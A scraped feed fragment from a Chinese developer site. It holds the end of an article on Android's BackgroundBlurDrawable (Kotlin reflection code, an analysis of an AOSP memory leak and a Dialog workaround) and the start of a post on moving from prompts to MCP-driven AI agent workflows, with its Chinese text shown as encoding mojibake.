    <span class="hljs-keyword">val</span> positionUpdateListener: RenderNode.PositionUpdateListener =
        <span class="hljs-keyword">object</span> : RenderNode.PositionUpdateListener {
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">positionChanged</span><span class="hljs-params">(
                frameNumber: <span class="hljs-type">Long</span>, left: <span class="hljs-type">Int</span>, top: <span class="hljs-type">Int</span>, right: <span class="hljs-type">Int</span>,
                bottom: <span class="hljs-type">Int</span>
            )</span></span> {
                onRenderNodePositionChanged.invoke(mAggregator, frameNumber, Runnable {
mRect.<span class="hljs-keyword">set</span>(left, top, right, bottom)
                    <span class="hljs-keyword">if</span> (mRect.top &lt; minTop) {
                        mRect.top = minTop
                    }
                    <span class="hljs-keyword">if</span> (mRect.bottom &lt; minTop) {
                        mRect.bottom = minTop
                    }
                    <span class="hljs-keyword">if</span> (mRect.top &gt; maxBottom) {
                        mRect.top = maxBottom
                    }
                    <span class="hljs-keyword">if</span> (mRect.bottom &gt; maxBottom) {
                        mRect.bottom = maxBottom
                    }
                    Log.e(<span class="hljs-string">"ssssssxxxx"</span>, <span class="hljs-string">"xxxx <span class="hljs-variable">$mRect</span>"</span>)
                } )
            }

            <span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">positionLost</span><span class="hljs-params">(frameNumber: <span class="hljs-type">Long</span>)</span></span> {
                onRenderNodePositionChanged.invoke(mAggregator, frameNumber, Runnable {
mRect.setEmpty()
                } )
            }
        }

    <span class="hljs-keyword">init</span> {
        <span class="hljs-keyword">val</span> mRenderNode = fieldRenderNode.<span class="hljs-keyword">get</span>(backgroundBlurDrawable) <span class="hljs-keyword">as</span> RenderNode
        mRenderNode.addPositionUpdateListener(positionUpdateListener)
        mRenderNode.removePositionUpdateListener(backgroundBlurDrawable.mPositionUpdateListener)
    }


    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">draw</span><span class="hljs-params">(canvas: <span class="hljs-type">Canvas</span>)</span></span> {
        <span class="hljs-keyword">if</span> (canvas.isHardwareAccelerated) {
            <span class="hljs-keyword">super</span>.draw(canvas)
        } <span class="hljs-keyword">else</span> {
            canvas.drawPath(mRectPath, mPaint)
        }
    }


    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">setColor</span><span class="hljs-params">(<span class="hljs-meta">@ColorInt</span> color: <span class="hljs-type">Int</span>)</span></span> {
        backgroundBlurDrawable.setColor(color)
    }

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">setBlurRadius</span><span class="hljs-params">(blurRadius: <span class="hljs-type">Int</span>)</span></span> {
        backgroundBlurDrawable.setBlurRadius(blurRadius)
    }

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">setCornerRadius</span><span class="hljs-params">(cornerRadius: <span class="hljs-type">Float</span>)</span></span> {
        backgroundBlurDrawable.setCornerRadius(cornerRadius)
    }


    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-meta">@SuppressLint(<span class="hljs-string">"PrivateApi"</span>)</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> classBackgroundBlurDrawable =
            Class.forName(<span class="hljs-string">"com.android.internal.graphics.drawable.BackgroundBlurDrawable"</span>)

        <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> fieldAggregator = classBackgroundBlurDrawable.getDeclaredField(<span class="hljs-string">"mAggregator"</span>)
            .apply { isAccessible = <span class="hljs-literal">true</span> }
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> fieldRect =
            classBackgroundBlurDrawable.getDeclaredField(<span class="hljs-string">"mRect"</span>).apply { isAccessible = <span class="hljs-literal">true</span> }

<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> fieldRectPath =
            classBackgroundBlurDrawable.getDeclaredField(<span class="hljs-string">"mRectPath"</span>).apply { isAccessible = <span class="hljs-literal">true</span> }

<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> fieldPaint =
            classBackgroundBlurDrawable.getDeclaredField(<span class="hljs-string">"mPaint"</span>).apply { isAccessible = <span class="hljs-literal">true</span> }

<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> fieldRenderNode = classBackgroundBlurDrawable.getDeclaredField(<span class="hljs-string">"mRenderNode"</span>)
            .apply { isAccessible = <span class="hljs-literal">true</span> }


<span class="hljs-meta">@SuppressLint(<span class="hljs-string">"PrivateApi"</span>)</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> onRenderNodePositionChanged =
            Class.forName(<span class="hljs-string">"com.android.internal.graphics.drawable.BackgroundBlurDrawable<span class="hljs-variable">$Aggregator</span>"</span>)
                .getDeclaredMethod(
                    <span class="hljs-string">"onRenderNodePositionChanged"</span>,
                    <span class="hljs-built_in">Long</span>::<span class="hljs-keyword">class</span>.java, Runnable::<span class="hljs-keyword">class</span>.java
).apply { isAccessible = <span class="hljs-literal">true</span> }


 <span class="hljs-comment">/**
* ç‰¹åˆ«æ³¨æ„ï¼š éœ€è¦viewåœ¨attachToWindowä¹‹å
*/</span>
<span class="hljs-meta">@JvmStatic</span>
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createFromView</span><span class="hljs-params">(hostView: <span class="hljs-type">View</span>)</span></span>: BackgroundBlurDrawableV2 {
            <span class="hljs-keyword">val</span> backgroundBlurDrawable = hostView.getViewRootImpl().createBackgroundBlurDrawable()
            <span class="hljs-keyword">return</span> BackgroundBlurDrawableV2(backgroundBlurDrawable)
        }
    }
}
</code></pre>
<h2 data-id="heading-5">3.  åŸç”Ÿå†…å­˜æ³„æ¼é—®é¢˜</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/281de38b09d945eca83b584231ea84ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767627126&amp;x-signature=T4jU0Bl888O%2BfKN8Xb7cxAkLO7U%3D" alt="" loading="lazy"/></p>
<p>å…¨éƒ¨æŒ‡å‘ <strong>CrossWindowBlurListenersï¼Œ</strong> è€Œä¸”æ ¹æ®è¿™ä¸ªå¼•ç”¨å…³ç³»ï¼Œå¯ä»¥å‘ç°æ˜¯DecorViewä¸­å¼•å…¥çš„</p>
<p>æŸ¥çœ‹DecorViewæºç ï¼Œç¡®å®æœ‰æ·»åŠ è¿™æ ·ä¸€ä¸ªç›‘å¬å™¨</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69b3cd8a40f8465cb2c9f3765a872f4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767627126&amp;x-signature=rnDlXr0ZbERS4OYRT1erkHmEw68%3D" alt="" loading="lazy"/></p>
<p>åœ¨onDetachedFromWindowæ—¶æ˜¯æœ‰ç§»é™¤è¯¥ç›‘å¬çš„é€»è¾‘çš„ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/294139b04f43492ab6462fdac90d6d6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767627126&amp;x-signature=LHxbrk8f4GlRkFr2Wz701Cs%2BSIY%3D" alt="" loading="lazy"/></p>
<p>é‚£ä¹ˆå¯ä»¥æ¨æ–­ï¼š<strong>é€ æˆè¯¥æ³„æ¼çš„åŸå› æ˜¯æ²¡æœ‰èµ°åˆ°onDetachedFromWindowè¿™é‡Œ</strong>ã€‚</p>
<p>æ­£å¸¸çª—å£å…³é—­è‚¯å®šæ˜¯ä¼šèµ°åˆ° <strong>onDetachedFromWindow</strong> çš„ï¼Œå¦‚æœæ²¡æœ‰èµ°åˆ°ï¼Œé‚£å¯èƒ½ä¹‹å‰æ ¹æœ¬å°±<strong>æ²¡æœ‰AttachedToWindowã€‚</strong></p>
<p>æœç´¢<strong>setBackgroundBlurRadius ï¼Œ</strong> å¯ä»¥å‘ç°æ˜¯ä»PhoneWindowè°ƒç”¨çš„</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52e4f20f062b4d5cb5af4cc8d0a1d641~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767627126&amp;x-signature=ZHU%2Fk6iy8f3R0J2qc2owFxvLgh4%3D" alt="" loading="lazy"/></p>
<p>å†ç»§ç»­æŸ¥çœ‹PhoneWindowæºç ï¼Œå‘ç°åœ¨<strong>generateLayout</strong> æ—¶å°±ä¼šsetBackgroundBlurRadiusäº†</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/937b4c05faca48b1b4c8e5fa8ab52365~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767627126&amp;x-signature=kRzyti%2FrRA0ZgTikL80qiJ1ik8o%3D" alt="" loading="lazy"/></p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿è¿™ä¸ªçª—å£æ²¡æœ‰æ˜¾ç¤ºï¼ˆæ²¡æœ‰AttachedToWindowï¼‰ï¼Œåªè¦è°ƒç”¨ <strong>generateLayout</strong> æˆ–è€… <strong>setBackgroundBlurRadius</strong></p>
<p>å°±ä¼šæ·»åŠ è¿™æ ·ä¸€ä¸ªç›‘å¬å™¨ï¼Œåç»­å¦‚æœæ²¡æœ‰<strong>AttachedToWindow</strong>ã€<strong>onDetachedFromWindow</strong> å°±ä¼šå‡ºç°å†…å­˜æ³„æ¼é—®é¢˜ã€‚</p>
<p>å¯èƒ½å­˜åœ¨çš„åœºæ™¯ï¼š</p>
<blockquote>
<p>æ„é€ äº†ä¸€ä¸ªDialogï¼Œè¿™ä¸ªDialogä¸»é¢˜ä¸­å£°æ˜ä½¿ç”¨ windowBackgroundBlurRadiusï¼Œ
å³ä½¿ç”¨BackgroundBlurDrawableï¼Œ</p>
<p>è°ƒç”¨äº†setContentView/æˆ–è€…getWindowï¼ˆéƒ½ä¼šè§¦å‘<strong>generateLayout</strong> å¯¼è‡´è®¾ç½®ç›‘å¬blurçš„ç›‘å¬å™¨ï¼‰</p>
<p>åç»­æ²¡æœ‰showï¼Œå°±ä¼šå‡ºç°å†…å­˜æ³„æ¼!!!</p>
</blockquote>
<p>è¿™å…¶å®æ˜¯AOSPä¸­ä¸€ä¸ªéå¸¸ä½çº§çš„ä»£ç ç¼–å†™é—®é¢˜ï¼š</p>
<p><strong>æ³¨å†Œç›‘å¬ï¼Œç§»é™¤ç›‘å¬æ²¡æœ‰å¯¹ç§°æ‰§è¡Œã€‚</strong></p>
<p>åŸåˆ™ä¸Šæ¥è¯´ï¼ŒgenerateLayout/setBackgroundBlurRadiusæ—¶ä¸åº”è¯¥ç›´æ¥æ³¨å†Œç›‘å¬ï¼Œ</p>
<p>åº”è¯¥åœ¨onAttachedToWindowæ—¶æ³¨å†Œç›‘å¬ï¼Œåœ¨onDetachedFromWindowæ—¶ç§»é™¤ç›‘å¬ï¼Œè¿™æ ·æ‰æ˜¯ç¬¦åˆå¯¹ç§°çš„è®¾è®¡ã€‚</p>
<p>å¯¹æ¯”é«˜ç‰ˆæœ¬ä»£ç ï¼Œç›´è‡³Android16ï¼ŒAOSPä¸­ä»æ²¡æœ‰ä¿®å¤è¯¥é—®é¢˜ã€‚</p>
<h3 data-id="heading-6">Appç«¯è§„é¿æ–¹æ¡ˆ</h3>
<p>ä¸ºäº†è§„é¿è¯¥é—®é¢˜ï¼Œåœ¨çª—å£ä¸»é¢˜ä¸­<strong>ä¸å»ºè®®</strong>å£°æ˜ä½¿ç”¨<strong>windowBackgroundBlurRadiusï¼Œ</strong> è¿™æ ·å¯ä»¥é¿å…Frameworkæµç¨‹ä¸­æå‰æ³¨å†Œblurç›‘å¬å™¨ã€‚</p>
<p>åœ¨çª—å£æ˜¾ç¤º/æ¶ˆå¤±æ—¶ï¼Œæ‰‹åŠ¨setBackgroundBlurRadiusï¼Œä¿è¯blurç›‘å¬å™¨çš„æ³¨å†Œ/ç§»é™¤å¯æ§ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TestDialog</span>(context: Context) : Dialog(context) {

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onStart</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onStart()
        <span class="hljs-comment">// åœ¨çª—å£æ˜¾ç¤ºæ—¶è®¾ç½®è‡ªå·±æœŸæœ›çš„æ¨¡ç³Šå€¼</span>
        window!!.setBackgroundBlurRadius(<span class="hljs-number">70</span>)
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onStop</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onStop()
        <span class="hljs-comment">// æ¨¡ç³Šå€¼æ¸…é›¶,è§¦å‘ç§»é™¤ç›‘å¬</span>
        <span class="hljs-comment">// (å…¶å®è¿™é‡Œä¸æ¸…é›¶ä¹Ÿå¯ä»¥,å› ä¸ºæ ¹æ®ä¸Šè¿°åˆ†ææµç¨‹,DecorViewä¼šåœ¨onDetachedFromWindowæ—¶ç§»é™¤ç›‘å¬)</span>
        window!!.setBackgroundBlurRadius(<span class="hljs-number">0</span>)
    }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026äº†ä½ è¿˜åªä¼šå†™ç‚¹promptï¼Ÿä»AIæç¤ºè¯åˆ°å¯æ§è‡ªåŠ¨åŒ–çš„æ¼”è¿›ä¹‹è·¯]]></title>    <link>https://juejin.cn/post/7589099845186682916</link>    <guid>https://juejin.cn/post/7589099845186682916</guid>    <pubDate>2025-12-29T12:08:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589099845186682916" data-draft-id="7589201772117360646" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026äº†ä½ è¿˜åªä¼šå†™ç‚¹promptï¼Ÿä»AIæç¤ºè¯åˆ°å¯æ§è‡ªåŠ¨åŒ–çš„æ¼”è¿›ä¹‹è·¯"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T12:08:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è„±æ°§æ ¸ç³–æ ¸é…¸"/> <meta itemprop="url" content="https://juejin.cn/user/1682680633885641"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026äº†ä½ è¿˜åªä¼šå†™ç‚¹promptï¼Ÿä»AIæç¤ºè¯åˆ°å¯æ§è‡ªåŠ¨åŒ–çš„æ¼”è¿›ä¹‹è·¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1682680633885641/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è„±æ°§æ ¸ç³–æ ¸é…¸
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T12:08:43.000Z" title="Mon Dec 29 2025 12:08:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">1ã€å‰è¨€</h3>
<blockquote>
<p>ç®€å•æ€»ç»“ä¸€ä¸‹ä¸ªäººä½¿ç”¨AIçš„è·¯çº¿æ¼”è¿›:</p>
<ul>
<li>å®šä¹‰promptä¼˜åŒ–AIæç¤ºå’Œè¡¥å…¨æ•ˆæœ</li>
<li>å®šä¹‰è§„åˆ™rulesçº¦æŸAIç”Ÿæˆçš„å¯æ§æ€§</li>
<li>å®šä¹‰å·¥ä½œæµï¼Œè®©AIåˆ†æ­¥æ‰§è¡Œä»»åŠ¡</li>
<li>é€šè¿‡Agentå®ç°AIè‡ªåŠ¨åŒ–å¯æ§å¼è¿­ä»£</li>
</ul>
</blockquote>
<p>å‰é¢3ä¸ªæ­¥éª¤æ¯”è¾ƒå¸¸è§ï¼Œè¿™é‡Œé¿å…å•°å—¦ï¼Œç›´æ¥æœ€åä¸€æ­¥ï¼›å¦å¤–æœ¬æ–‡ä¸æ¶‰åŠå…·ä½“å®ç°ç»†èŠ‚ï¼Œåªåˆ†äº«æ•´ä½“æ¶æ„ä»¥åŠå¯¹åº”çš„æ¼”åŒ–æ€è·¯ã€‚</p>
<h3 data-id="heading-1">2ã€æœ€åˆçš„è®¾æƒ³</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[çº¿ä¸Šç³»ç»Ÿè¿è¡Œ] --&gt; B[çº¿ä¸Šé”™è¯¯ç›‘æ§]
    A --&gt; C[ç”¨æˆ·åé¦ˆ]

    D[æ¥å£æ–‡æ¡£]
    E[éœ€æ±‚æ–‡æ¡£]

    %% MCP æ¨¡å—
    B --&gt; M[MCP Server]
    C --&gt; M
    D --&gt; M
    E --&gt; M
    M --&gt; F[AI Agent]
    F --&gt;|è‡ªåŠ¨åˆ†æä¸å†³ç­–| G[ç”Ÿæˆ / ä¿®æ”¹ä»£ç ]
    G --&gt;|è‡ªåŠ¨æäº¤| H[éƒ¨ç½²ä¸Šçº¿]

    H --&gt;|å½¢æˆé—­ç¯| A

    style M fill:#e3f2fd
    style F fill:#e1f5ff
    style G fill:#e1ffe1
    style H fill:#fff4e1
    style A fill:#ffe8e1
</code></pre>
<p>æœ€åˆçš„æƒ³æ³•å¾ˆç®€å•ï¼Œå°±æ˜¯æŠŠæ—¥å¸¸å¼€å‘éœ€è¦çš„ä¸œè¥¿å…¨éƒ¨ä¸¢ç»™AIï¼Œè‡ªå·±åšæ’’æ‰‹æŒæŸœï¼Œ<strong>è¿™é‡Œè§£å†³å‘AIä¼ è¾“æ•°æ®çš„æ ¸å¿ƒæ–¹å¼æ˜¯é€šè¿‡MCPåè®®æ„å»ºçš„MCP ServeræœåŠ¡</strong>ã€‚</p>
<p>MCPå…¨ç§°(Model Context Protocol)ï¼Œå¯ä»¥è‡ªå·±æœä¸€ä¸‹ï¼Œä¸»è¦æ˜¯ç”¨æ¥è§£å†³è¿™äº›Promptçš„é—®é¢˜ï¼š</p>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> ä¸å¯æ ¡éªŒ</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> ä¸å¯diff</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> ä¸å¯å›æ»š</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> ä¸å¯ç»„åˆ</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> ä¸å¯è§„æ¨¡åŒ–</li>
</ul>
<p>ä¸ºäº†è§£å†³è¿™äº›ä¸ªé—®é¢˜ï¼Œå¤§å®¶ä¸å¾—ä¸æ‰“æˆäº†å…±è¯†ã€‚</p>
<h3 data-id="heading-2">3ã€é‡åˆ°çš„é—®é¢˜</h3>
<h4 data-id="heading-3">3.1ã€AIé¡¹ç›®è¿­ä»£çš„å¤±æ§</h4>
<p>å¦‚æœå¤§å®¶æœ‰è‡ªå·±äº²æ‰‹å°è¯•ä»é›¶å¼€å§‹ç”Ÿæˆä¸€ä¸ªé¡¹ç›®è¿›è¡Œè¿­ä»£ï¼Œå°±ä¼šé‡åˆ°ä¸€äº›å¾ˆæ˜æ˜¾çš„åœºæ™¯ï¼š</p>
<ol>
<li>åˆå§‹ç”Ÿæˆï¼ŒæƒŠä¸ºå¤©äºº</li>
<li>åç»­ä¿®æ”¹ï¼Œé€æ¸å´©æºƒ</li>
<li>ç»†èŠ‚è°ƒæ•´ï¼Œå¼€å§‹æ··ä¹±</li>
<li>å¯¹è¯è¿‡é•¿ï¼Œèƒ¡è¨€ä¹±è¯­</li>
<li>é—®é¢˜ä¿®å¤ï¼Œé™·å…¥å¾ªç¯</li>
</ol>
<p>å®é™…è¿è¡Œæ•ˆæœå¦‚ä¸‹ğŸ˜…ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    D1[Day 1: AIå¿«é€Ÿæ­å»ºç³»ç»Ÿ]
    D2[Day 2: AIä¿®æ”¹åŠŸèƒ½]
    P1[é—å¿˜æ—©æœŸè®¾è®¡å†³ç­–]
    P2[ä¿®Bugå¼•å…¥æ–°Bug]
    P3[ä»£ç è†¨èƒ€ 5k -&gt; 12k 40%å†—ä½™]
    P4[åŒä¸€éœ€æ±‚å¤šæ¬¡ç”Ÿæˆç»“æœä¸ä¸€è‡´]
    M3[Day 3: ä¸æ•¢å†è®©AIæ”¹ä»£ç ]

    %% ä¸»çº¿
    D1 --&gt; D2
    D2 --&gt; P1
    D2 --&gt; P2
    D2 --&gt; P3
    D2 --&gt; P4
    P1 --&gt; M3
    P2 --&gt; M3
    P3 --&gt; M3
    P4 --&gt; M3
</code></pre>
<p>é‡åˆ°é—®é¢˜å°±è§£å†³é—®é¢˜ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    %% èµ·ç‚¹
    A[åæ€ä¸ºä»€ä¹ˆå¤±è´¥] --&gt; B[æ ¹æœ¬åŸå› ]

    %% é¡¿æ‚Ÿé˜¶æ®µ
    B --&gt; C1[AIæ²¡æœ‰é•¿æœŸè®°å¿†]
    B --&gt; C2[ä»£ç æ˜¯å”¯ä¸€è½½ä½“]
    B --&gt; C3[æ¯æ¬¡éƒ½è¦é‡è¯»ä»£ç ]

    %% æ°¸ä¹…è®°å¿†é˜¶æ®µ
    C1 --&gt; D[æ€è€ƒ&amp;é¡¿æ‚Ÿ]
    C2 --&gt; D[æ€è€ƒ&amp;é¡¿æ‚Ÿ]
    C3 --&gt; D[æ€è€ƒ&amp;é¡¿æ‚Ÿ]

    %% è§£å†³æ–¹æ¡ˆé˜¶æ®µ
    D --&gt; E1[AIéœ€è¦é•¿æœŸè®°å¿†]
    E1 --&gt; E2[æå–é¡¹ç›®æ ¸å¿ƒå…ƒæ•°æ® - AST]

    %% äº§ç‰©é˜¶æ®µ
    E2 --&gt; F1[ASTæ˜¯é¡¹ç›®çš„åŸºå› ]
    E2 --&gt; F2[ä»£ç æ˜¯åŸºå› ç¼–è¯‘çš„ä¸€æ¬¡æ€§äº§ç‰©]
    E2 --&gt; F3[AIæ˜¯åŸºå› ç¼–è¯‘å®ä½“çš„å·¥å…·]

    %% APS-DSLè¯ç”Ÿ
    F1 --&gt; G[APS-DSLè¯ç”Ÿ]
    F2 --&gt; G[APS-DSLè¯ç”Ÿ]
    F3 --&gt; G[APS-DSLè¯ç”Ÿ]

</code></pre>
<p>ç„¶åæˆ‘ä»¬çš„æ•´ä½“æµç¨‹å°±å˜æˆäº†è¿™æ ·ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
